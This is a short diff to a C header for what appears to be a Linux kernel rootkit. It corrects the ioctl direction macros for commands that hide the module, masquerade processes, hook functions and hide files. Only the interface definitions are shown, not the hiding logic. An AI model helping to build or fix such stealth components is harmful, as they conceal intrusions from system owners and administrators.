@@ -20,8 +20,10 @@ struct hided_file {
 
 #define MAGIC 'k'
 #define IOCTL_MOD_HIDE  _IO(MAGIC, 0)
-#define IOCTL_MOD_MASQ  _IOR(MAGIC, 1, struct masq_proc_req)
+// _IOW: userland writes the parameter, the kernel reads it (copy_from_user) —
+// matches what lkm_ioctl actually does for these two commands.
+#define IOCTL_MOD_MASQ  _IOW(MAGIC, 1, struct masq_proc_req)
 #define IOCTL_MOD_HOOK  _IO(MAGIC, 2)
-#define IOCTL_FILE_HIDE _IOR(MAGIC, 3, struct hided_file)
+#define IOCTL_FILE_HIDE _IOW(MAGIC, 3, struct hided_file)
 
 #endif /* __LOADABLE_KERNEL_MODULE_H */
